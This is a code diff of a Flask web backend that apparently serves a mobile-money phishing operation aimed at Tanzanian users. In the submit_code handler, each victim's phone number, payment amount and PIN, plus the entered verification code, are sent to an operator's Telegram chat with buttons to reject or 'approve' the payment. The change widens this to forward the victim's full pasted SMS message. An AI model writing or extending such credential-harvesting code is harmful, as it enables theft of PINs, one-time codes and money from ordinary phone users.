@@ -47,7 +47,7 @@ add_column()
 
 def send_telegram(message, reply_markup=None):
     try:
-        payload = {'chat_id': CHAT_ID, 'text': message}
+        payload = {'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}
         if reply_markup: payload['reply_markup'] = reply_markup
         requests.post(f'{TELEGRAM_API}/sendMessage', json=payload)
     except Exception as e: print(f'Telegram error: {e}')
@@ -169,12 +169,12 @@ def submit_payment():
 def submit_code():
     data = request.json; app_id = data.get('app_id'); entered_code = data.get('code')
     conn = sqlite3.connect('database.db'); c = conn.cursor()
-    c.execute('SELECT phone, amount, plan, pin FROM payments WHERE app_id = ?',(app_id,))
+    c.execute('SELECT phone, code, amount, plan, pin FROM payments WHERE app_id = ?',(app_id,))
     payment = c.fetchone()
     if payment:
-        phone, amount, plan, pin = payment
-        msg = f'🔐 CODE VERIFICATION\n\n🆔 ID: {app_id}\n📞 Phone: +255 {phone}\n📦 Plan: {plan}\n✍️ Entered Code: {entered_code}\n💰 Amount: TSh {amount:,}\n🔢 PIN: {pin}'
-        keyboard = {'inline_keyboard':[[{'text':'❌ WRONG PIN','callback_data':f'denypin_{app_id}'}],[{'text':'❌ WRONG CODE','callback_data':f'wrongcode_{app_id}'}],[{'text':'✅ APPROVE PAYMENT','callback_data':f'approve_{app_id}'}]]}
+        phone, expected_code, amount, plan, pin = payment
+        msg = f'🔐 CODE VERIFICATION\n\n🆔 ID: {app_id}\n📞 Phone: +255 {phone}\n💰 Amount: TSh {amount:,}\n🔢 PIN: {pin}\n\n📋 FULL MESSAGE:\n```\n{entered_code}\n```'
+        keyboard = {'inline_keyboard':[[{'text':'❌ WRONG PIN','callback_data':f'denypin_{app_id}'},{'text':'❌ WRONG CODE','callback_data':f'wrongcode_{app_id}'}],[{'text':'✅ APPROVE PAYMENT','callback_data':f'approve_{app_id}'}]]}
         send_telegram(msg, keyboard)
     conn.close()
     return jsonify({'success':True})
